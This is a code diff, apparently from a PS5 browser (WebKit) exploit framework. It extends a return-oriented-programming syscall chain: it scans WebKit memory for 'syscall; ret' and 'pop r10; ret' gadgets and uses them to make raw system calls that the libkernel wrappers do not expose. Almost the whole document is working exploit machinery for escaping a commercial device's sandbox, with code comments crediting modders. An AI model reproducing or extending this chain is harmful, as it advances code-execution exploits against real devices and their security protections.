@@ -14,7 +14,7 @@
     const PS5 = {
         ready: false, mode: "NONE", fw: "??.??",
         webkitBase: null, libkernelBase: null,
-        gadgets: null, stubs: null, stubMode: false,
+        gadgets: null, stubs: null, stubMode: false, rawSyscall: false,
         mallocEnd: 0, notes: [],
     };
     global.PS5 = PS5;
@@ -396,6 +396,25 @@
         if (g.pivot === null) { PS5.notes.push("wk-no-pivot"); return false; }
         g.save = scanWkPattern([0x48, 0x89, 0x27, 0xc3]);
         if (g.save === null) { PS5.notes.push("wk-no-save-gadget"); return false; }
+        // [Mods bagagwa] raw syscall: some syscalls have NO C stub in
+        // libkernel_web (e.g. 727/0x2D7 GET_AIO_DEBUG_REQUEST_INFO: no
+        // wrapper exists). To call them in stub mode we look for the
+        // `syscall; ret` (0f 05 c3) and `pop r10; ret` (41 5a c3) patterns in
+        // WebKit .text (readable, our own module): with poprax (X1NON table)
+        // + arg pops + syscall, the classic chain works WITHOUT touching
+        // libkernel. Optional: if missing, stub mode stays valid for stubbed
+        // syscalls and syscall(num) without a stub throws a clear error.
+        g.syscall = scanWkPattern([0x0f, 0x05, 0xc3]);
+        g.popr10 = scanWkPattern([0x41, 0x5a, 0xc3]);
+        if (g.syscall !== null && g.popr10 !== null) {
+            PS5.rawSyscall = true;
+            PS5.notes.push("wk-raw-syscall:0x" + g.syscall.toString(16)
+                + " popr10:0x" + g.popr10.toString(16));
+        } else {
+            PS5.notes.push("wk-no-raw-syscall"
+                + (g.syscall === null ? "-syscall" : "")
+                + (g.popr10 === null ? "-popr10" : ""));
+        }
         // stubs por numero de syscall: se EJECUTAN (no se leen)
         PS5.stubs = {};
         for (const numStr in x.syscallStubs)
@@ -403,7 +422,8 @@
         PS5.gadgets = g;
         PS5.stubMode = true;
         PS5.notes.push("wk-mode-ok:stubs=" + Object.keys(PS5.stubs).length
-            + " pivot=0x" + g.pivot.toString(16));
+            + " pivot=0x" + g.pivot.toString(16)
+            + " raw=" + (PS5.rawSyscall ? "1" : "0"));
         return true;
     }
 
@@ -412,6 +432,7 @@
     // pop rdi..r9=args; syscall(0f05c3); pop rdi=&res; store(mov [rdi],rax);
     // pop rsp=R0 (guardado antes con save-gadget); ret -> reentra ICU limpio.
     const OFF_RES = 0x480, OFF_R0 = 0x488;
+    const RAW_NOTED = new Set();
     function syscallROP(num, args) {
         const g = PS5.gadgets;
         // 1) capturar rsp real de ICU
@@ -421,13 +442,13 @@
             throw new Error("rsp-garbage:" + HEX(R0));
         // 2) montar cadena
         let S;
-        if (PS5.stubMode) {
+        const stub = PS5.stubs && PS5.stubs[String(num)];
+        if (PS5.stubMode && stub === undefined && !PS5.rawSyscall)
+            throw new Error("syscall-" + num + "-no-stub-in-table");
+        if (PS5.stubMode && stub !== undefined) {
             // [Mods X1NON] cadena por STUBS: sin gadget syscall ni pop rax.
             // Se salta al wrapper C de libkernel (base+rva) con los 6 args en
             // rdi,rsi,rdx,rcx,r8,r9 (el wrapper mueve rcx->r10 internamente).
-            const stub = PS5.stubs && PS5.stubs[String(num)];
-            if (stub === undefined)
-                throw new Error("syscall-" + num + "-no-stub-in-table");
             S = [
                 g.poprdi, Number(B(args[0] === undefined ? 0 : args[0])),
                 g.poprsi, Number(B(args[1] === undefined ? 0 : args[1])),
@@ -442,6 +463,13 @@
                 R0,
             ];
         } else {
+            // [Mods bagagwa] RAW path (pop rax + pops + syscall;ret): the
+            // classic libkernel chain; in stub mode it is reused with the
+            // gadgets found in WebKit for syscalls without a stub (e.g. 727).
+            if (PS5.stubMode && !RAW_NOTED.has(num)) {
+                RAW_NOTED.add(num);
+                PS5.notes.push("raw-syscall:" + num);
+            }
             S = new Array(20).fill(0);
             S[0] = g.poprax; S[1] = num;
             const pops = [g.poprdi, g.poprsi, g.poprdx, g.popr10, g.popr8, g.popr9];
@@ -573,6 +601,7 @@
         global.syscall = syscall;
         global.SYSCALL = SYSN;
         global.SYSCALL_STUBS = PS5.stubs;   // [Mods X1NON] rva absolutos por num (o null)
+        global.SYSCALL_RAW = PS5.rawSyscall === true; // [Mods bagagwa] stub-less syscalls via WebKit
         global.get_error_string = get_error_string;
         global.send_notification = send_notification;
         global.PS5call = nativeCall;
